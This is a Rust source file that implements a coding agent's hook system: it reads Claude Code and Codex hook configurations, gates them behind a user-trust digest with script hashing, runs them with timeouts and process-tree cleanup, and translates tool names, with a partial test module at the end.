//! Hooks: commands the user set up to run at points of the agent loop (before a tool call, after
//! it, when a prompt is sent, when the agent is done, ...). They're read in the formats Claude Code
//! and Codex use, so hooks written for those agents work here too:
//! - Claude Code: `hooks` in `~/.claude/settings.json`, `.claude/settings.json` and
//!   `.claude/settings.local.json`;
//! - Codex: `~/.codex/hooks.json` and `.codex/hooks.json`.
//!
//! Each event has matcher groups, each with command handlers. A handler gets the event as JSON on
//! stdin and answers with its exit code (0 fine, 2 blocks, anything else is a failure that doesn't
//! block) and, optionally, a JSON object on stdout (`decision`, `hookSpecificOutput`, ...). Tools
//! are named and shaped the way those agents name them (`Bash` with `command`, `Edit` with
//! `file_path`, ...), so their scripts and matchers apply; a matcher may also use DevCat's names.
//!
//! The app decides whether hooks run at all: they run commands, so the user trusts them first
//! ([`Found::digest`] changes when any hook does).
use crate::tools::{ToolCtx, resolve};
use regex::Regex;
use serde_json::{Map, Value, json};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// Hook files in the project folder, in this order.
pub const PROJECT_FILES: &[&str] = &[".claude/settings.json", ".claude/settings.local.json", ".codex/hooks.json"];
/// Hook files in the home folder.
pub const USER_FILES: &[&str] = &[".claude/settings.json", ".codex/hooks.json"];

/// The events DevCat Agent runs hooks for.
pub const EVENTS: &[&str] = &["SessionStart", "UserPromptSubmit", "PreToolUse", "PermissionRequest", "PostToolUse", "PostToolUseFailure", "Stop", "SubagentStop", "PreCompact", "PostCompact"];

/// Longest a hook may run, unless it says (as in Claude Code and Codex).
const DEFAULT_TIMEOUT: Duration = Duration::from_secs(600);
/// A prompt waits for its hooks: they get less by default (as in Claude Code).
const PROMPT_TIMEOUT: Duration = Duration::from_secs(30);
/// Context a hook adds is cut here (as in Claude Code).
const MAX_CONTEXT: usize = 10_000;
/// Output read from a hook.
const MAX_OUTPUT: usize = 1_000_000;

#[derive(Debug, Clone, PartialEq)]
struct Handler {
    command: String,
    /// Run `command` with these arguments, without a shell (Claude Code's exec form).
    args: Option<Vec<String>>,
    /// Codex's `commandWindows`: what to run on Windows instead.
    command_windows: Option<String>,
    /// `shell: "powershell"` (Claude Code).
    powershell: bool,
    timeout: Option<Duration>,
    /// Run in the background: the hook can't block or change anything.
    background: bool,
    /// Claude Code's `if`: a permission rule such as `Bash(git *)` the call must match.
    rule: Option<String>,
    /// The script files it runs, with a hash of each as the user allowed it (see [`scripts`]).
    scripts: Vec<(PathBuf, u64)>,
}

#[derive(Debug, Clone)]
enum Matcher {
    All,
    /// Exact names (`Edit|Write`, `Edit,Write`).
    Names(Vec<String>),
    /// Anything else is an unanchored regex (`mcp__.*`, `^Bash$`).
    Regex(Regex),
}

impl Matcher {
    fn parse(m: Option<&str>) -> Result<Matcher, String> {
        let m = m.map(str::trim).unwrap_or("");
        if m.is_empty() || m == "*" {
            return Ok(Matcher::All);
        }
        if m.chars().all(|c| c.is_ascii_alphanumeric() || " _-,|".contains(c)) {
            return Ok(Matcher::Names(m.split(['|', ',']).map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()));
        }
        Regex::new(m).map(Matcher::Regex).map_err(|e| format!("matcher `{m}`: {e}"))
    }

    fn hits(&self, names: &[&str]) -> bool {
        match self {
            Matcher::All => true,
            Matcher::Names(list) => names.iter().any(|n| list.iter().any(|l| l == n)),
            Matcher::Regex(re) => names.iter().any(|n| re.is_match(n)),
        }
    }
}

#[derive(Debug, Clone)]
struct Group {
    event: String,
    matcher: Matcher,
    handlers: Vec<Handler>,
}

/// The hooks that run for a folder.
#[derive(Debug, Clone, Default)]
pub struct Hooks {
    groups: Vec<Group>,
}

/// What [`load`] found: the hooks, and what to show the user before they trust them.
#[derive(Debug, Clone, Default)]
pub struct Found {
    pub hooks: Hooks,
    /// The files with hooks (`~/…` for the home folder) and how many commands each has.
    pub files: Vec<(String, usize)>,
    /// Each command with its event and matcher: "PreToolUse (Bash): ./check.sh".
    pub commands: Vec<String>,
    /// What can't run here: other events and handler types, files that don't parse.
    pub skipped: Vec<String>,
    /// Changes when any hook changes: what the user trusts.
    pub digest: String,
}

/// Read the hooks for `cwd` from the user's and the project's Claude Code and Codex files.
pub fn load(cwd: &Path, home: Option<&Path>) -> Found {
    let mut found = Found::default();
    let mut sources: Vec<(String, PathBuf)> = Vec::new();
    if let Some(h) = home {
        sources.extend(USER_FILES.iter().map(|f| (format!("~/{f}"), h.join(f))));
    }
    sources.extend(PROJECT_FILES.iter().map(|f| (f.to_string(), cwd.join(f))));
    // the same file twice (a project in the home folder) counts once
    let mut seen: Vec<PathBuf> = Vec::new();
    let mut files: Vec<(String, Value)> = Vec::new();
    for (label, path) in sources {
        let Ok(text) = std::fs::read_to_string(&path) else { continue };
        let canon = std::fs::canonicalize(&path).unwrap_or(path.clone());
        if seen.contains(&canon) {
            continue;
        }
        seen.push(canon);
        match serde_json::from_str(text.trim_start_matches('\u{feff}')) {
            Ok(v) => files.push((label, v)),
            Err(e) => found.skipped.push(format!("{label}: not valid JSON ({e})")),
        }
    }
    // `disableAllHooks` in any Claude Code file turns off all of Claude Code's hooks, as there
    let claude = |label: &str| label.contains(".claude/");
    let claude_off = files.iter().find(|(label, v)| claude(label) && v.get("disableAllHooks").and_then(Value::as_bool) == Some(true)).map(|(label, _)| label.clone());
    let mut digest_text = String::new();
    for (label, v) in files {
        if claude(&label) && let Some(by) = &claude_off {
            if v.get("hooks").and_then(Value::as_object).is_some_and(|h| !h.is_empty()) {
                found.skipped.push(format!("{label}: its hooks (disableAllHooks is on in {by})"));
            }
            continue;
        }
        let Some(events) = v.get("hooks").and_then(Value::as_object) else { continue };
        digest_text.push_str(&format!("{label}\n{}\n", Value::Object(events.clone())));
        let before: usize = found.hooks.groups.iter().map(|g| g.handlers.len()).sum();
        for (event, groups) in events {
            if !EVENTS.contains(&event.as_str()) {
                found.skipped.push(format!("{label}: {event} hooks (DevCat Agent has no such event)"));
                continue;
            }
            for g in groups.as_array().into_iter().flatten() {
                let matcher = match Matcher::parse(g.get("matcher").and_then(Value::as_str)) {
                    Ok(m) => m,
                    Err(e) => {
                        found.skipped.push(format!("{label}: {event} {e}"));
                        continue;
                    }
                };
                let mut handlers = Vec::new();
                for h in g.get("hooks").and_then(Value::as_array).into_iter().flatten() {
                    match parse_handler(h) {
                        Ok(mut handler) => {
                            let m = g.get("matcher").and_then(Value::as_str).filter(|m| !m.trim().is_empty() && m.trim() != "*");
                            found.commands.push(format!("{event}{}: {}", m.map(|m| format!(" ({m})")).unwrap_or_default(), shown(&handler)));
                            // what the scripts say is part of what the user allows
                            handler.scripts = scripts(&handler, cwd, home);
                            for (path, hash) in &handler.scripts {
                                digest_text.push_str(&format!("{} {hash:016x}\n", path.display()));
                            }
                            handlers.push(handler);
                        }
                        Err(e) => found.skipped.push(format!("{label}: {event} {e}")),
                    }
                }
                if !handlers.is_empty() {
                    found.hooks.groups.push(Group { event: event.clone(), matcher, handlers });
                }
            }
        }
        let after: usize = found.hooks.groups.iter().map(|g| g.handlers.len()).sum();
        if after > before {
            found.files.push((label, after - before));
        }
    }
    found.digest = if found.hooks.is_empty() { String::new() } else { format!("{:016x}", fnv1a(digest_text.as_bytes())) };
    found
}

fn parse_handler(h: &Value) -> Result<Handler, String> {
    let s = |k: &str| h.get(k).and_then(Value::as_str).map(String::from);
    match h.get("type").and_then(Value::as_str).unwrap_or("command") {
        // Codex wrote "shell" for a while
        "command" | "shell" => {}
        other => return Err(format!("{other} hooks (only command hooks run in DevCat Agent)")),
    }
    let command = s("command").filter(|c| !c.trim().is_empty()).ok_or("hook without a command")?;
    Ok(Handler {
        command,
        args: h.get("args").and_then(Value::as_array).map(|a| a.iter().map(|v| v.as_str().map(String::from).unwrap_or_else(|| v.to_string())).collect()),
        command_windows: s("commandWindows").or_else(|| s("command_windows")),
        powershell: s("shell").is_some_and(|sh| sh.eq_ignore_ascii_case("powershell") || sh.eq_ignore_ascii_case("pwsh")),
        timeout: h.get("timeout").and_then(Value::as_f64).filter(|t| *t > 0.0).map(Duration::from_secs_f64),
        background: h.get("async").and_then(Value::as_bool) == Some(true),
        rule: s("if").filter(|r| !r.trim().is_empty()),
        scripts: Vec::new(),
    })
}

/// Programs that run the file after them: `bash .claude/hooks/x.sh`, `python3 check.py`.
const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "fish", "python", "python3", "node", "deno", "bun", "ruby", "perl", "php", "pwsh", "powershell", "powershell.exe", "pwsh.exe", "tsx", "ts-node"];

/// The script files a handler runs, as far as its words tell, with a hash of each: the first word
/// of each command in it (`.claude/hooks/check.sh`, `"$CLAUDE_PROJECT_DIR"/hooks/x.sh`,
/// `~/bin/guard`), or the file after an interpreter (`python3 .claude/hooks/check.py`). Only files
/// that exist count, so `npx prettier` or `jq` add nothing.
fn scripts(h: &Handler, cwd: &Path, home: Option<&Path>) -> Vec<(PathBuf, u64)> {
    let dir = cwd.to_string_lossy();
    let mut commands: Vec<String> = vec![h.command.clone()];
    commands.extend(h.command_windows.clone());
    if let Some(args) = &h.args {
        // exec form: the program and its arguments, one command
        commands = vec![std::iter::once(h.command.clone()).chain(args.iter().map(|a| if a.contains(' ') { format!("\"{a}\"") } else { a.clone() })).collect::<Vec<_>>().join(" ")];
    }
    let mut out: Vec<(PathBuf, u64)> = Vec::new();
    for command in &commands {
        for part in command.split(['\n', ';', '|', '&']) {
            let words: Vec<String> = part.split_whitespace().map(|w| w.replace(['"', '\''], "").replace("${CLAUDE_PROJECT_DIR}", &dir).replace("$CLAUDE_PROJECT_DIR", &dir)).collect();
            let Some(first) = words.first() else { continue };
            let name = Path::new(first).file_name().and_then(|n| n.to_str()).unwrap_or("").to_lowercase();
            let at = |w: &String| match w.strip_prefix("~/") {
                Some(rest) => home.map(|h| h.join(rest)),
                None => Some(cwd.join(w)),
            };
            // an interpreter's file: its first word that's an option-less existing file (none
            // for code given inline with -c)
            let file = if INTERPRETERS.contains(&name.as_str()) {
                if words.iter().skip(1).any(|w| w == "-c" || w.eq_ignore_ascii_case("-command") || w == "-e") {
                    continue;
                }
                words.iter().skip(1).filter(|w| !w.starts_with('-')).filter_map(at).find(|p| p.is_file())
            } else {
                at(first).filter(|p| p.is_file())
            };
            if let Some(path) = file
                && !out.iter().any(|(p, _)| p == &path)
                && let Ok(bytes) = std::fs::read(&path)
            {
                out.push((path, fnv1a(&bytes)));
            }
        }
    }
    out
}

/// A script that changed since the user allowed the hooks, if any.
fn changed_script(h: &Handler) -> Option<&Path> {
    h.scripts.iter().find(|(path, hash)| std::fs::read(path).map(|b| fnv1a(&b)).ok() != Some(*hash)).map(|(p, _)| p.as_path())
}

/// The command as the user reads it.
fn shown(h: &Handler) -> String {
    let c = if cfg!(windows) { h.command_windows.as_ref().unwrap_or(&h.command) } else { &h.command };
    match &h.args {
        Some(a) if !a.is_empty() => format!("{c} {}", a.join(" ")),
        _ => c.clone(),
    }
}

/// FNV-1a: a hash that stays the same across Rust versions (the digest is saved).
fn fnv1a(bytes: &[u8]) -> u64 {
    bytes.iter().fold(0xcbf29ce484222325u64, |h, b| (h ^ *b as u64).wrapping_mul(0x100000001b3))
}

/// About the call a hook runs for: who is asking and where.
#[derive(Debug, Clone)]
pub struct Context<'a> {
    pub session_id: &'a str,
    pub transcript: &'a Path,
    pub cwd: &'a Path,
    /// Claude Code's name for the permission mode: `default`, `acceptEdits`, `bypassPermissions`, `plan`.
    pub permission_mode: &'a str,
    pub model: String,
    /// In a helper: its id (the `subagent` call) and type.
    pub agent: Option<&'a str>,
}

/// What the hooks of one event decided, together.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Outcome {
    /// Blocked (exit code 2, `decision: "block"`, `permissionDecision: "deny"`), with the reason.
    pub block: Option<String>,
    /// `continue: false`: stop the turn, with `stopReason`.
    pub stop: Option<String>,
    /// `permissionDecision: "allow"` / PermissionRequest `behavior: "allow"`.
    pub allow: bool,
    /// `permissionDecision: "ask"`.
    pub ask: bool,
    /// `updatedInput`, in the hook's shape (see [`native_input`]).
    pub updated_input: Option<Value>,
    /// PostToolUse `updatedToolOutput`: the tool's result as the model gets it.
    pub updated_output: Option<String>,
    /// For the model: `additionalContext`, feedback (exit code 2 after a tool), or plain output
    /// where it counts as context (SessionStart, UserPromptSubmit).
    pub context: Vec<String>,
    /// For the user: `systemMessage`, and hooks that failed.
    pub notes: Vec<String>,
}

impl Hooks {
    pub fn is_empty(&self) -> bool {
        self.groups.is_empty()
    }

    /// Whether any hook is set for `event` (callers skip building the input otherwise).
    pub fn has(&self, event: &str) -> bool {
        self.groups.iter().any(|g| g.event == event)
    }

    /// Run the hooks of `event` whose matcher fits `names` (tool names, or the source / trigger;
    /// None for events without matchers), all at once, with `fields` added to the common input.
    pub async fn run(&self, event: &str, names: Option<&[&str]>, ctx: &Context<'_>, fields: Value) -> Outcome {
        let tool = (fields.get("tool_name").and_then(Value::as_str), fields.get("tool_input"));
        let mut handlers: Vec<&Handler> = Vec::new();
        for g in self.groups.iter().filter(|g| g.event == event) {
            if names.is_some_and(|n| !g.matcher.hits(n)) {
                continue;
            }
            for h in &g.handlers {
                if h.rule.as_deref().is_some_and(|r| !rule_hits(r, tool.0, tool.1)) || handlers.contains(&h) {
                    continue;
                }
                handlers.push(h);
            }
        }
        let mut out = Outcome::default();
        if handlers.is_empty() {
            return out;
        }
        let mut input = json!({
            "session_id": ctx.session_id,
            "transcript_path": ctx.transcript.to_string_lossy(),
            "cwd": ctx.cwd.to_string_lossy(),
            "hook_event_name": event,
            "permission_mode": ctx.permission_mode,
            "model": ctx.model,
        });
        if let Some(id) = ctx.agent {
            input["agent_id"] = json!(id);
            input["agent_type"] = json!("helper");
        }
        if let (Value::Object(i), Value::Object(f)) = (&mut input, fields) {
            i.extend(f);
        }
        let stdin = input.to_string();
        let default = if event == "UserPromptSubmit" { PROMPT_TIMEOUT } else { DEFAULT_TIMEOUT };
        let runs = handlers.iter().map(|h| run_handler(h, &stdin, ctx.cwd, h.timeout.unwrap_or(default)));
        for (h, r) in handlers.iter().zip(futures::future::join_all(runs).await) {
            if !h.background {
                read_reply(event, h, r, &mut out);
            }
        }
        out
    }
}

/// What a handler did: its exit code and output, or why it didn't run to the end.
type Run = Result<(Option<i32>, String, String), String>;

/// Fold one handler's answer into `out`.
fn read_reply(event: &str, h: &Handler, run: Run, out: &mut Outcome) {
    let name = format!("{event} hook `{}`", short(&shown(h)));
    let (code, stdout, stderr) = match run {
        Ok(r) => r,
        Err(e) => return out.notes.push(format!("{name} {e}")),
    };
    let after_tool = event.starts_with("PostToolUse");
    match code {
        Some(0) => {}
        Some(2) => {
            let reason = if stderr.trim().is_empty() { format!("blocked by the {name}") } else { stderr.trim().to_string() };
            if after_tool {
                out.context.push(cap(&reason));
            } else if event != "PermissionRequest" && event != "PostCompact" && event != "SessionStart" {
                add_block(out, reason);
            }
            return;
        }
        other => {
            let why = stderr.lines().find(|l| !l.trim().is_empty()).unwrap_or("").trim().to_string();
            let code = other.map(|c| format!("exit code {c}")).unwrap_or_else(|| "killed".into());
            out.notes.push(format!("{name} failed ({code}){}", if why.is_empty() { String::new() } else { format!(": {why}") }));
            return;
        }
    }
    let text = stdout.trim();
    let reply = if text.starts_with('{') { serde_json::from_str::<Map<String, Value>>(text).ok() } else { None };
    let Some(j) = reply else {
        if !text.is_empty() && (event == "UserPromptSubmit" || event == "SessionStart") {
            out.context.push(cap(text));
        }
        return;
    };
    let s = |v: Option<&Value>| v.and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty()).map(String::from);
    if j.get("continue").and_then(Value::as_bool) == Some(false) {
        out.stop = Some(s(j.get("stopReason")).unwrap_or_else(|| format!("The {name} stopped the agent.")));
    }
    if let Some(m) = s(j.get("systemMessage")) {
        out.notes.push(m);
    }
    let reason = s(j.get("reason"));
    match j.get("decision").and_then(Value::as_str) {
        Some("block") if after_tool => out.context.push(cap(reason.as_deref().unwrap_or("A hook flagged this result."))),
        Some("block") => add_block(out, reason.clone().unwrap_or_else(|| format!("blocked by the {name}"))),
        // Claude Code's older PreToolUse answer
        Some("approve") if event == "PreToolUse" => out.allow = true,
        _ => {}
    }
    let Some(specific) = j.get("hookSpecificOutput") else { return };
    if let Some(c) = s(specific.get("additionalContext")) {
        out.context.push(cap(&c));
    }
    match event {
        "PreToolUse" => {
            let why = s(specific.get("permissionDecisionReason"));
            match specific.get("permissionDecision").and_then(Value::as_str) {
                Some("deny") => add_block(out, why.unwrap_or_else(|| format!("denied by the {name}"))),
                Some("allow") => out.allow = true,
                Some("ask") => out.ask = true,
                _ => {}
            }
            if let Some(u) = specific.get("updatedInput").filter(|u| u.is_object()) {
                out.updated_input = Some(u.clone());
            }
        }
        "PermissionRequest" => {
            let d = specific.get("decision");
            match d.and_then(|d| d.get("behavior")).and_then(Value::as_str) {
                Some("deny") => add_block(out, s(d.and_then(|d| d.get("message"))).unwrap_or_else(|| format!("denied by the {name}"))),
                Some("allow") => out.allow = true,
                _ => {}
            }
        }
        "PostToolUse" | "PostToolUseFailure" => {
            if let Some(o) = specific.get("updatedToolOutput") {
                out.updated_output = Some(o.as_str().map(String::from).unwrap_or_else(|| o.to_string()));
            }
        }
        _ => {}
    }
}

fn add_block(out: &mut Outcome, reason: String) {
    out.block = Some(match out.block.take() {
        Some(b) => format!("{b}\n{reason}"),
        None => reason,
    });
}

fn cap(s: &str) -> String {
    if s.len() <= MAX_CONTEXT {
        return s.to_string();
    }
    let mut end = MAX_CONTEXT;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}… [cut at {MAX_CONTEXT} characters]", &s[..end])
}

fn short(s: &str) -> String {
    if s.chars().count() <= 60 { s.to_string() } else { format!("{}…", s.chars().take(60).collect::<String>()) }
}

/// Claude Code's `if`: `Bash(git *)`, `Edit(*.ts)` or just `Bash`. `*` matches anything; the
/// pattern is checked against the command or the file path.
fn rule_hits(rule: &str, tool: Option<&str>, input: Option<&Value>) -> bool {
    let rule = rule.trim();
    let (name, pattern) = match rule.find('(') {
        Some(i) if rule.ends_with(')') => (&rule[..i], Some(&rule[i + 1..rule.len() - 1])),
        _ => (rule, None),
    };
    if tool != Some(name.trim()) {
        return false;
    }
    let Some(pattern) = pattern else { return true };
    let target = input.and_then(|i| i.get("command").or_else(|| i.get("file_path")).or_else(|| i.get("url"))).and_then(Value::as_str).unwrap_or("");
    wildcard(pattern.trim(), target)
}

/// `*` matches any run of characters; everything else matches itself.
fn wildcard(pattern: &str, text: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return pattern == text;
    }
    let mut rest = text;
    for (i, part) in parts.iter().enumerate() {
        if i == 0 {
            let Some(r) = rest.strip_prefix(part) else { return false };
            rest = r;
        } else if i == parts.len() - 1 {
            return rest.ends_with(part);
        } else {
            let Some(at) = rest.find(part) else { return false };
            rest = &rest[at + part.len()..];
        }
    }
    true
}

/// Kills a hook's whole process tree when dropped while armed: on a timeout, or when Stop drops the
/// turn. Killing only the shell would leave what it started running. On macOS and Linux the hook
/// leads its own process group (setsid); on Windows it's put in a job object, which what it
/// starts joins too (Git Bash's processes don't form a tree `taskkill /T` can follow).
struct Tree {
    #[cfg(unix)]
    pid: Option<u32>,
    #[cfg(windows)]
    job: Option<job::Job>,
    armed: bool,
}

impl Tree {
    fn of(child: &tokio::process::Child) -> Tree {
        Tree {
            #[cfg(unix)]
            pid: child.id(),
            #[cfg(windows)]
            job: child.raw_handle().and_then(job::Job::with),
            armed: true,
        }
    }

    fn done(mut self) {
        self.armed = false;
    }
}

impl Drop for Tree {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        #[cfg(unix)]
        if let Some(pid) = self.pid {
            unsafe extern "C" {
                fn kill(pid: i32, sig: i32) -> i32;
            }
            // its group id is its pid; 9 = SIGKILL
            // SAFETY: a plain system call.
            unsafe {
                kill(-(pid as i32), 9);
            }
        }
        #[cfg(windows)]
        if let Some(job) = &self.job {
            job.kill();
        }
    }
}

#[cfg(windows)]
mod job {
    use std::ffi::c_void;

    type Handle = *mut c_void;

    #[link(name = "kernel32")]
    unsafe extern "system" {
        fn CreateJobObjectW(attributes: *const c_void, name: *const u16) -> Handle;
        fn AssignProcessToJobObject(job: Handle, process: Handle) -> i32;
        fn TerminateJobObject(job: Handle, exit_code: u32) -> i32;
        fn CloseHandle(handle: Handle) -> i32;
    }

    /// A job object: the processes in it, and the ones they start.
    pub struct Job(Handle);

    // SAFETY: a kernel handle, usable from any thread.
    unsafe impl Send for Job {}
    unsafe impl Sync for Job {}

    impl Job {
        /// A new job with `process` in it.
        pub fn with(process: std::os::windows::io::RawHandle) -> Option<Job> {
            // SAFETY: plain calls; the handles are checked, and the job's is closed on failure.
            unsafe {
                let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
                if job.is_null() {
                    return None;
                }
                if AssignProcessToJobObject(job, process as Handle) == 0 {
                    CloseHandle(job);
                    return None;
                }
                Some(Job(job))
            }
        }

        pub fn kill(&self) {
            // SAFETY: our own open handle.
            unsafe {
                TerminateJobObject(self.0, 1);
            }
        }
    }

    impl Drop for Job {
        fn drop(&mut self) {
            // SAFETY: our own open handle, closed once. Closing doesn't end the processes.
            unsafe {
                CloseHandle(self.0);
            }
        }
    }
}

/// Run one handler with `stdin`, in `cwd`, for at most `limit`.
async fn run_handler(h: &Handler, stdin: &str, cwd: &Path, limit: Duration) -> Run {
    if let Some(script) = changed_script(h) {
        let shown = script.strip_prefix(cwd).unwrap_or(script);
        return Err(format!("didn't run: {} changed since you allowed the hooks. Allow them again to run it.", shown.display()));
    }
    let mut cmd = command(h, cwd);
    cmd.current_dir(cwd).env("CLAUDE_PROJECT_DIR", cwd).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
    // DevCat has no console of its own: without this, Windows opens one per hook and it flashes
    #[cfg(windows)]
    cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    #[cfg(unix)]
    // its own session: no terminal to take over (see the shell tool)
    unsafe {
        cmd.pre_exec(|| {
            crate::tools::libc_setsid();
            Ok(())
        });
    }
    cmd.kill_on_drop(true);
    if h.background {
        // on its own: Stop doesn't end it, its timeout does; nothing reads its output
        cmd.stdout(Stdio::null()).stderr(Stdio::null());
        let mut child = cmd.spawn().map_err(|e| format!("didn't start: {e}"))?;
        let mut pipe = child.stdin.take();
        let input = stdin.to_string();
        tokio::spawn(async move {
            let tree = Tree::of(&child);
            if let Some(p) = pipe.as_mut() {
                let _ = p.write_all(input.as_bytes()).await;
            }
            drop(pipe);
            match tokio::time::timeout(limit, child.wait()).await {
                Ok(_) => tree.done(),
                Err(_) => drop(tree),
            }
        });
        return Ok((Some(0), String::new(), String::new()));
    }
    let mut child = cmd.spawn().map_err(|e| format!("didn't start: {e}"))?;
    let tree = Tree::of(&child);
    let mut pipe = child.stdin.take();
    let (mut out, mut err) = (child.stdout.take().unwrap(), child.stderr.take().unwrap());
    let work = async {
        let write = async {
            if let Some(p) = pipe.as_mut() {
                // a hook that doesn't read its input closes the pipe early: that's fine
                let _ = p.write_all(stdin.as_bytes()).await;
            }
            drop(pipe);
        };
        let (mut o, mut e) = (Vec::new(), Vec::new());
        let (mut out, mut err) = ((&mut out).take(MAX_OUTPUT as u64), (&mut err).take(MAX_OUTPUT as u64));
        let _ = tokio::join!(write, out.read_to_end(&mut o), err.read_to_end(&mut e));
        let status = child.wait().await;
        (o, e, status)
    };
    let (o, e, status) = tokio::time::timeout(limit, work).await.map_err(|_| format!("timed out after {} s", limit.as_secs()))?;
    tree.done();
    Ok((status.ok().and_then(|s| s.code()), String::from_utf8_lossy(&o).into_owned(), String::from_utf8_lossy(&e).into_owned()))
}

/// How a handler runs: exec form with `args`; otherwise through a shell, like Claude Code and
/// Codex: `sh -c` on macOS and Linux; on Windows `commandWindows` or `shell: "powershell"` in
/// PowerShell, else Git Bash when it's installed (hooks are mostly shell scripts), else PowerShell.
fn command(h: &Handler, cwd: &Path) -> tokio::process::Command {
    let dir = cwd.to_string_lossy();
    let fill = |s: &str| s.replace("${CLAUDE_PROJECT_DIR}", &dir);
    if let Some(args) = &h.args {
        let mut c = tokio::process::Command::new(fill(&h.command));
        c.args(args.iter().map(|a| fill(a)));
        return c;
    }
    if cfg!(windows) {
        let bash = if h.command_windows.is_none() && !h.powershell { git_bash() } else { None };
        if let Some(bash) = bash {
            let mut c = tokio::process::Command::new(bash);
            c.args(["-c", &h.command]);
            return c;
        }
        let script = fill(h.command_windows.as_deref().unwrap_or(&h.command));
        let mut c = tokio::process::Command::new("powershell.exe");
        c.args(["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", &format!("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; {script}")]);
        c
    } else {
        let mut c = tokio::process::Command::new("/bin/sh");
        c.args(["-c", &h.command]);
        c
    }
}

/// Git for Windows' bash (not WSL's `bash.exe` in System32).
fn git_bash() -> Option<PathBuf> {
    static FOUND: std::sync::OnceLock<Option<PathBuf>> = std::sync::OnceLock::new();
    FOUND
        .get_or_init(|| {
            let mut candidates: Vec<PathBuf> = ["ProgramFiles", "ProgramW6432", "ProgramFiles(x86)"].iter().filter_map(std::env::var_os).map(|p| PathBuf::from(p).join("Git").join("bin").join("bash.exe")).collect();
            if let Some(local) = std::env::var_os("LOCALAPPDATA") {
                candidates.push(PathBuf::from(local).join("Programs").join("Git").join("bin").join("bash.exe"));
            }
            // next to git.exe on the PATH (…\Git\cmd\git.exe → …\Git\bin\bash.exe)
            for dir in std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect::<Vec<_>>()).unwrap_or_default() {
                if dir.join("git.exe").is_file()
                    && let Some(root) = dir.parent()
                {
                    candidates.push(root.join("bin").join("bash.exe"));
                }
            }
            candidates.into_iter().find(|p| p.is_file())
        })
        .clone()
}

/// How Claude Code and Codex name a DevCat Agent tool, and its input in their shape (`file_path`
/// instead of `path`, `git` as a `Bash` command). Hooks get these.
pub fn foreign_tool(name: &str, input: &Value, cwd: &Path) -> (String, Value) {
    let ctx = ToolCtx::at(cwd);
    let mut v = input.clone();
    let with_file_path = |v: &mut Value| {
        if let Some(obj) = v.as_object_mut()
            && let Some(p) = obj.remove("path")
        {
            let abs = p.as_str().map(|p| resolve(&ctx, p).to_string_lossy().into_owned()).map(Value::String).unwrap_or(p);
            obj.insert("file_path".into(), abs);
        }
    };
    let foreign = match name {
        "shell" => {
            let mut b = json!({ "command": input.get("command").cloned().unwrap_or(Value::Null) });
            if let Some(t) = input.get("timeout_secs").and_then(Value::as_u64) {
                b["timeout"] = json!(t * 1000);
            }
            return ("Bash".into(), b);
        }
        "git" => {
            let args: Vec<String> = input.get("args").and_then(Value::as_array).map(|a| a.iter().filter_map(Value::as_str).map(quote).collect()).unwrap_or_default();
            return ("Bash".into(), json!({ "command": format!("git {}", args.join(" ")) }));
        }
        "read" | "write" | "edit" => {
            with_file_path(&mut v);
            match name {
                "read" => "Read",
                "write" => "Write",
                _ => "Edit",
            }
        }
        "glob" => "Glob",
        "grep" => "Grep",
        "web_fetch" => "WebFetch",
        "todo_write" => "TodoWrite",
        "subagent" => "Task",
        "ask_user" => "AskUserQuestion",
        other => other,
    };
    (foreign.to_string(), v)
}

/// The names a matcher may use for a DevCat tool: its own, Claude Code's and Codex's.
pub fn tool_names(name: &str) -> Vec<&str> {
    let mut n = vec![name];
    n.extend_from_slice(match name {
        "shell" | "git" => &["Bash"],
        "read" => &["Read"],
        "write" => &["Write", "apply_patch"],
        "edit" => &["Edit", "MultiEdit", "apply_patch"],
        "glob" => &["Glob"],
        "grep" => &["Grep"],
        "web_fetch" => &["WebFetch"],
        "todo_write" => &["TodoWrite", "update_plan"],
        "subagent" => &["Task", "Agent", "spawn_agent"],
        "ask_user" => &["AskUserQuestion"],
        _ => &[],
    });
    n
}

/// A hook's `updatedInput` back in DevCat's shape, over the original; None when the tool's input
/// can't be rewritten that way (`git`, given as a `Bash` command).
pub fn native_input(name: &str, original: &Value, updated: &Value) -> Option<Value> {
    let mut v = match original {
        Value::Object(o) => o.clone(),
        _ => Map::new(),
    };
    let u = updated.as_object()?;
    match name {
        "git" => return None,
        "shell" => {
            v.insert("command".into(), u.get("command").filter(|c| c.is_string())?.clone());
        }
        _ => {
            for (k, val) in u {
                let k = if k == "file_path" && matches!(name, "read" | "write" | "edit") { "path" } else { k.as_str() };
                v.insert(k.to_string(), val.clone());
            }
        }
    }
    Some(Value::Object(v))
}

fn quote(a: &str) -> String {
    if !a.is_empty() && a.chars().all(|c| c.is_ascii_alphanumeric() || "-_./:=@^~+,%".contains(c)) { a.to_string() } else { format!("'{}'", a.replace('\'', r"'\''")) }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir() -> PathBuf {
        let d = std::env::temp_dir().join(format!("devcat-hooks-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn matchers_like_claude_code() {
        let m = |s: &str| Matcher::parse(Some(s)).unwrap();
        assert!(m("").hits(&["anything"]) && m("*").hits(&["x"]));
        assert!(m("Edit|Write").hits(&["write", "Write"]) && !m("Edit|Write").hits(&["Read"]));
        assert!(m("Edit, Write").hits(&["Write"]));
        // exact names: "Bash" isn't "BashOutput"
        assert!(!m("Bash").hits(&["BashOutput"]));
        assert!(m("mcp__.*").hits(&["mcp__github__list"]) && m("^Bash$").hits(&["Bash"]));
        assert!(Matcher::parse(Some("([")).is_err());
    }

    #[test]
    fn rules_and_wildcards() {
        let bash = json!({ "command": "git push --force" });
        assert!(rule_hits("Bash(git *)", Some("Bash"), Some(&bash)));
        assert!(!rule_hits("Bash(npm *)", Some("Bash"), Some(&bash)));
